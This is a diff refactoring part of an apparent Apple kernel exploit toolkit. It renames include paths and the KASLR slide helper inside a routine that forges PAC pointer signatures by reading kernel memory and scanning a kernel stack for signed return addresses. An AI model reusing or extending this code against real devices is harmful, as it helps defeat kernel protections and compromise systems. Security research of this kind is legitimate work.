@@ -9,15 +9,15 @@
 #include <IOKit/IOKitLib.h>
 #include <IOSurface/IOSurface.h>
 
-#include "util_pacda.h"
-#include "util_ptrauth.h"
-#include "util_lck_rw.h"
-#include "util_dispatch.h"
+#include "util/pacda.h"
+#include "util/ptrauth.h"
+#include "util/lck_rw.h"
+#include "util/dispatch.h"
 #include "platform_params.h"
-#include "kmem.h"
-#include "slider.h"
-#include "util_assert.h"
-#include "util_log.h"
+#include "memory/kmem.h"
+#include "slider/kernel.h"
+#include "util/assert.h"
+#include "util/log.h"
 
 //#define LR_ENSURE_CAPACITY_KFREE 0xfffffe00078f3cbc
 //#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072b9ea8
@@ -112,7 +112,7 @@ uintptr_t xe_util_pacda_get_kstack_ptr(uintptr_t thread) {
 int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
     xe_log_debug("signing pointer %p with context %p", (void*)ptr, (void*)ctx);
     
-    uintptr_t kheap_default = xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR);
+    uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
     uintptr_t kalloc_map = xe_kmem_read_uint64(KMEM_OFFSET(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET));
     uintptr_t kalloc_map_lck = KMEM_OFFSET(kalloc_map, TYPE_VM_MAP_MEM_LCK_RW_OFFSET);
     
@@ -148,13 +148,13 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     kstackptr -= STACK_SCAN_SIZE;
     xe_kmem_read(stack, kstackptr, STACK_SCAN_SIZE);
     
-    uintptr_t lr_kfree = xe_util_pacda_find_ptr(kstackptr, stack, STACK_SCAN_SIZE, xe_slider_slide(LR_ENSURE_CAPACITY_KFREE), XE_PTRAUTH_MASK);
+    uintptr_t lr_kfree = xe_util_pacda_find_ptr(kstackptr, stack, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_ENSURE_CAPACITY_KFREE), XE_PTRAUTH_MASK);
     if (lr_kfree == 0) {
         error = EAGAIN;
         goto exit;
     }
         
-    uintptr_t lr_lck_rw_excl_gen = xe_util_pacda_find_ptr(kstackptr, stack, STACK_SCAN_SIZE, xe_slider_slide(LR_LCK_RW_LOCK_EXCLUSIVE_GEN), XE_PTRAUTH_MASK);
+    uintptr_t lr_lck_rw_excl_gen = xe_util_pacda_find_ptr(kstackptr, stack, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_LCK_RW_LOCK_EXCLUSIVE_GEN), XE_PTRAUTH_MASK);
     if (lr_lck_rw_excl_gen == 0) {
         error = EAGAIN;
         goto exit;
